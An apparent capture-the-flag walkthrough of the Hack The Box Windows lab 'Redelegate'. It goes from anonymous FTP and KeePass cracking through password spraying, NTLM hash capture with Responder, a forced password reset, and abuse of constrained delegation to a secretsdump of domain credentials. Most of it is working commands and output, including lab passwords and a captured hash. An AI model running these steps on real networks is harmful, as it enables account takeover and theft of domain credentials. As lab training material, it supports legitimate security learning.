---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Delegation
  - SeEnableDelegationPrivilege
  - Bloodhound
  - Secrets-Dump
  - MSSQL
---
# Overview

| Name        | Redelegate |
| ----------- | ---------- |
| OS          | Windows    |
| Base Points | Hard [45]  |
| Status      | Done       |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- -T4 10.129.234.50
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 12:52 CDT
Warning: 10.129.234.50 giving up on port because retransmission cap hit (6).
Stats: 0:08:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.24% done; ETC: 13:02 (0:01:20 remaining)
Stats: 0:11:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.27% done; ETC: 13:03 (0:00:00 remaining)
Nmap scan report for 10.129.234.50
Host is up (0.075s latency).
Not shown: 65319 closed tcp ports (reset), 184 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 18:03:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.234.50:1433: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-15T17:38:56
|_Not valid after:  2055-10-15T17:38:56
| ms-sql-info: 
|   10.129.234.50:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-15T18:04:07+00:00; +10s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-15T18:04:00+00:00
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2025-10-14T17:36:18
|_Not valid after:  2026-04-15T17:36:18
|_ssl-date: 2025-10-15T18:04:07+00:00; +10s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49584/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-10-15T18:04:07+00:00; +10s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.234.50:49932: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.234.50:49932: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49932
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-15T17:38:56
|_Not valid after:  2055-10-15T17:38:56
51834/tcp open  msrpc         Microsoft Windows RPC
51835/tcp open  msrpc         Microsoft Windows RPC
51836/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51838/tcp open  msrpc         Microsoft Windows RPC
51839/tcp open  msrpc         Microsoft Windows RPC
51840/tcp open  msrpc         Microsoft Windows RPC
51851/tcp open  msrpc         Microsoft Windows RPC
61668/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 9s, deviation: 0s, median: 9s
| smb2-time: 
|   date: 2025-10-15T18:03:59
|_  start_date: N/A
```
# Enumeration
## FTP

```bash
$ ftp 10.129.234.50
Connected to 10.129.234.50.
220 Microsoft FTP Service
Name (10.129.234.50:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||63401|)
125 Data connection already open; Transfer starting.
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> get Shared.kdbx
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||63402|)
125 Data connection already open; Transfer starting.
100% |***********************************|  2622       31.94 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 10 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
2622 bytes received in 00:00 (31.82 KiB/s)
```

```bash
$ keepass2john Shared.kdbx >hash

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt.gz 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

This took long so downloaded other text files too.

```bash
$ cat TrainingAgenda.txt 
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them

$ cat CyberAudit.txt 
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

We can form password from these hints. 

From `TrainingAgenda.txt`:

- There's a specific mention: `Why "SeasonYear!" is not a good password`
- This suggests "SeasonYear!" might actually be in use as a password pattern

From `CyberAudit.txt`:

- Weak user passwords were identified as an issue
- Password changes were prompted but may still follow predictable patterns

Given that it's October 2024 and the training mentions "SeasonYear!" as a bad password, let's try some variations:

```bash
echo "SeasonYear!" > wordlist.txt
echo "Season2024!" >> wordlist.txt  
echo "Autumn2024!" >> wordlist.txt
echo "Fall2024!" >> wordlist.txt
echo "October2024!" >> wordlist.txt
echo "Winter2024!" >> wordlist.txt
echo "Spring2024!" >> wordlist.txt
echo "Summer2024!" >> wordlist.txt
```

Still no crack. When transferring binary files like KeePass databases via FTP from Windows to Linux, using ASCII mode can corrupt the file because it converts line endings, which breaks the binary structure. So we can use `binary` to send it in binary.

```bash
$ ftp 10.129.234.50
Connected to 10.129.234.50.
220 Microsoft FTP Service
Name (10.129.234.50:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> get Shared.kdbx
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||57517|)
125 Data connection already open; Transfer starting.
100% |***********************************|  2622       34.08 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (33.94 KiB/s)
ftp> exit
221 Goodbye.
```

Now try:

```bash
$ keepass2john Shared.kdbx >hash

$ john hash --wordlist=wordlist.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared) 
```

We get pass `Fall2024!`.

```bash
$ kpcli Shared.kdbx

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> open ./Shared.kdbx
Provide the master password: *************************
kpcli:/> ls
=== Groups ===
Shared/
kpcli:/> cd Shared
kpcli:/Shared> ls
kpcli:/Shared> find .
Searching for "." ...
 - 7 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. FS01 Admin                                                             
1. FTP                                                                    
2. KeyFob Combination                                                     
3. Payrol App                                                             
4. SQL Guest Access                                                       
5. Timesheet Manager                                                      
6. WEB01    
```

```bash
kpcli:/Shared> show -f 0    

 Path: /Shared/IT/
Title: FS01 Admin
Uname: Administrator
 Pass: Spdv41gg4BlBgSYIW1gF
  URL: 
Notes: 

kpcli:/Shared> show -f 1

 Path: /Shared/IT/
Title: FTP
Uname: FTPUser
 Pass: SguPZBKdRyxWzvXRWy6U
  URL: 
Notes: Deprecated

kpcli:/Shared> show -f 2

 Path: /Shared/HelpDesk/
Title: KeyFob Combination
Uname: 
 Pass: 22331144
  URL: 
Notes: 

kpcli:/Shared> show -f 3

 Path: /Shared/Finance/
Title: Payrol App
Uname: Payroll
 Pass: cVkqz4bCM7kJRSNlgx2G
  URL: 
Notes: 

kpcli:/Shared> show -f 4

 Path: /Shared/IT/
Title: SQL Guest Access
Uname: SQLGuest
 Pass: zDPBpaF4FywlqIv11vii
  URL: 
Notes: 

kpcli:/Shared> show -f 5

 Path: /Shared/Finance/
Title: Timesheet Manager
Uname: Timesheet
 Pass: hMFS4I0Kj8Rcd62vqi5X
  URL: 
Notes: 

kpcli:/Shared> show -f 6

 Path: /Shared/IT/
Title: WEB01
Uname: WordPress Panel
 Pass: cn4KOEgsHqvKXPjEnSD9
  URL: 
Notes: 
```

```
Administrator
FTPUser  
Payroll
SQLGuest
Timesheet
```

```
Spdv41gg4BlBgSYIW1gF
SguPZBKdRyxWzvXRWy6U
cVkqz4bCM7kJRSNlgx2G
zDPBpaF4FywlqIv11vii
hMFS4I0Kj8Rcd62vqi5X
```
## MSSQL Spray

```bash
$ nxc mssql 10.129.234.50 -u user.txt -p pass.txt --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [-] DC\Administrator:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\FTPUser:Spdv41gg4BlBgSYIW1gF (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Payroll:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Payroll'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\SQLGuest:Spdv41gg4BlBgSYIW1gF (Login failed for user 'SQLGuest'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Timesheet:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Administrator:SguPZBKdRyxWzvXRWy6U (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\FTPUser:SguPZBKdRyxWzvXRWy6U (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Payroll:SguPZBKdRyxWzvXRWy6U (Login failed for user 'Payroll'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\SQLGuest:SguPZBKdRyxWzvXRWy6U (Login failed for user 'SQLGuest'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Timesheet:SguPZBKdRyxWzvXRWy6U (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')
^CMSSQL       10.129.234.50   1433   DC               [-] DC\Administrator:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\FTPUser:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Payroll:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'Payroll'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\SQLGuest:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'SQLGuest'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Timesheet:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Administrator:zDPBpaF4FywlqIv11vii (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\FTPUser:zDPBpaF4FywlqIv11vii (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Payroll:zDPBpaF4FywlqIv11vii (Login failed for user 'Payroll'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
```

```bash
$ mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@10.129.234.50
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> 
```

```bash
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (SQLGuest  guest@master)> EXEC sp_configure 'show advanced options', 1;
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
SQL (SQLGuest  guest@master)> 
```

Cant use `xp_cmdshell` So using responder.

```bash
SQL (SQLGuest  guest@master)> EXEC xp_dirtree '\\10.10.14.122\share';
subdirectory   depth   
------------   -----   
```

```bash
$ sudo responder -I tun0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.122]
    Responder IPv6             [dead:beef:2::1078]
    Challenge set              [random]
    Dont Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-DXDHF46RH16]
    Responder Domain Name      [P7IE.LOCAL]
    Responder DCE-RPC Port     [46070]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.234.50
[SMB] NTLMv2-SSP Username : REDELEGATE\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::REDELEGATE:e240564a5b4ef131:CDBCDBFA318E068337EEF413DA339DED:0101000000000000000BFD99D83DDC018715D1760AF385120000000002000800500037004900450001001E00570049004E002D004400580044004800460034003600520048003100360004003400570049004E002D00440058004400480046003400360052004800310036002E0050003700490045002E004C004F00430041004C000300140050003700490045002E004C004F00430041004C000500140050003700490045002E004C004F00430041004C0007000800000BFD99D83DDC0106000400020000000800300030000000000000000000000000300000672DF16396585CC88DC000AFFD1C946497F1CA06F1480CC9F3E53570625019D20A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320032000000000000000000
```

```bash
hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt
```

But it can't be cracked nor we can do anything.

```bash
SQL (SQLGuest  guest@master)> select sys.fn_varbintohexstr(SUSER_SID('redelegate\Administrator'))
                                                             
----------------------------------------------------------   
0x010500000000000515000000a185deefb22433798d8e847af4010000   
```

```bash
SQL (SQLGuest  guest@master)>  SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847af4010000);
                                
-----------------------------   
WIN-Q13O908QBPG\Administrator 
```

```bash
nxc smb 10.129.234.50 --generate-hosts-file
```

```bash
echo "10.129.234.50 redelegate.htb dc.redelegate.htb redelegate.vl dc.redelegate.vl" | sudo tee -a /etc/hosts
```

Script to enumerate users with RID between 1000 and 1500.

```bash
#!/bin/bash

SID_BASE="010500000000000515000000a185deefb22433798d8e847a"

for RID in {1000..1500}; do
    HEX_RID=$(python -c "import struct; print(struct.pack('<I', ${RID}).hex())")
    SID="${SID_BASE}${HEX_RID}"
    RES=$(mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -file <( echo "select SUSER_SNAME(0x${SID});") 2>&1 | sed -n '/^----/{n;p;}')
    echo -n $'\r'"${RID}: ${RES}"
    [[ "$(echo "$RES" | xargs)" != "NULL" ]] && echo
done
```

```bash
$ ./main.sh 
1000: REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG   
1002: REDELEGATE\DC$   
1103: REDELEGATE\FS01$   
1104: REDELEGATE\Christine.Flanders   
1105: REDELEGATE\Marie.Curie   
1106: REDELEGATE\Helen.Frost   
1107: REDELEGATE\Michael.Pontiac   
1108: REDELEGATE\Mallory.Roberts   
1109: REDELEGATE\James.Dinkleberg   
1112: REDELEGATE\Helpdesk   
1113: REDELEGATE\IT   
1114: REDELEGATE\Finance   
1115: REDELEGATE\DnsAdmins   
1116: REDELEGATE\DnsUpdateProxy   
1117: REDELEGATE\Ryan.Cooper   
1119: REDELEGATE\sql_svc  
```

```bash
$ cat > user.txt << 'EOF'
SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
DC$
FS01$
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Ryan.Cooper
sql_svc
EOF

$ cat pass.txt 
Spdv41gg4BlBgSYIW1gF
SguPZBKdRyxWzvXRWy6U
cVkqz4bCM7kJRSNlgx2G
zDPBpaF4FywlqIv11vii
hMFS4I0Kj8Rcd62vqi5X
```

```bash
$ netexec smb dc.redelegate.vl -u user.txt -p pass.txt --continue-on-success 
```

This doesn't work so tried pass  `Fall2024!`:

```bash
$ netexec smb dc.redelegate.vl -u user.txt -p 'Fall2024!' --continue-on-success 
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG:Fall2024! STATUS_LOGON_FAILURE
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\FS01$:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helen.Frost:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Michael.Pontiac:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:Fall2024! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\James.Dinkleberg:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Ryan.Cooper:Fall2024! STATUS_LOGON_FAILURE 
```

We get correct creds worked at `Marie.Curie:Fall2024!` (RDP) also opens but its in restricted mode and we can't bypass it unless we are domain admins.
## Bloodhound

```bash
$ bloodhound-python -d redelegate.vl -u Marie.Curie -p 'Fall2024!' -c all -ns 10.129.234.50
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: redelegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: dc.redelegate.vl
WARNING: SID S-1-5-21-3745110700-3336928118-3915974013-1109 lookup failed, return status: STATUS_NONE_MAPPED
INFO: Done in 00M 16S
```
# Initial Foothold
## Reset Password

![[redelegate.png]]

**Marie Curie** is a member of **Helpdesk**, and guess what? **Helpdesk** has **ForceChangePassword** permissions over **Helen T.**. What does that mean? **Simple** — we can change **Helen’s** password and log in as **her**. The domain just handed us another key — let’s use it.

```bash
$ bloodyAD -d redelegate.vl -u Marie.Curie -p 'Fall2024!' --host 10.129.234.50 set password 'Helen.Frost' 'Winter2024!'
[+] Password changed successfully!
```

If you get error in changing password do like with password policy like how `Winter2024!` which follows its password policy like for eg: `SeasonYear!`.

```bash
$ nxc winrm 10.129.234.50 -u Helen.Frost -p 'Winter2024!' 
WINRM       10.129.234.50   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
WINRM       10.129.234.50   5985   DC               [+] redelegate.vl\Helen.Frost:Winter2024! (Pwn3d!)

$ evil-winrm -i 10.129.234.50 -u Helen.Frost -p 'Winter2024!'

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> ls


    Directory: C:\Users\Helen.Frost\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/15/2025  10:37 AM             34 user.txt


*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> cat user.txt
f75a29212100ed1cd1be8a05f98af4ac
```
# Privilege Escalation

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
redelegate\helen.frost S-1-5-21-4024337825-2033394866-2055507597-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
REDELEGATE\IT                               Group            S-1-5-21-4024337825-2033394866-2055507597-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Since box name is **SeEnableDelegationPrivilege** we can focus in this.
## `SeEnableDelegationPrivilege`

Check for `MachineAccountQuota`:

```bash
$ nxc ldap 10.129.234.50 -u Helen.Frost -p 'Winter2024!' -M maq
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
LDAP        10.129.234.50   389    DC               [+] redelegate.vl\Helen.Frost:Winter2024! 
MAQ         10.129.234.50   389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.234.50   389    DC               MachineAccountQuota: 0
```

Since MachineAccountQuota is 0, we cannot create new machine accounts. But we already have control over the existing FS01 machine account through GenericAll permissions. **Delegation** in Active Directory is like giving someone **permission to use your identity** to access another service on your behalf.

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop>
# Enable "Trusted for Delegation" on the FS01 computer account
# This allows FS01 to request service tickets on behalf of other users
# Sets the TRUSTED_TO_AUTH_FOR_DELEGATION flag in userAccountControl
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True

*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop>
# Specify which service FS01 can delegate to
# Sets msDS-AllowedToDelegateTo attribute to allow delegation to LDAP service on DC
# This means FS01 can only impersonate users to the LDAP service on the domain controller
Set-ADObject -Identity "CN=FS01,CN=Computers,DC=redelegate,DC=vl" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}

*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop>
# Reset the FS01 computer account password
# We need to know the password to authenticate as FS01 when requesting service tickets
# ConvertTo-SecureString converts plain text to secure string format required by PowerShell
Set-ADAccountPassword -Identity "FS01$" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPass123!" -Force)
```

```bash
$ getST.py -impersonate 'dc$' -spn 'ldap/dc.redelegate.vl' 'redelegate.vl/FS01$:NewPass123!'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc$@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```
## SecretsDump

```bash
$ export KRB5CCNAME=dc\$@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache

$ secretsdump.py -k -no-pass dc.redelegate.vl
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
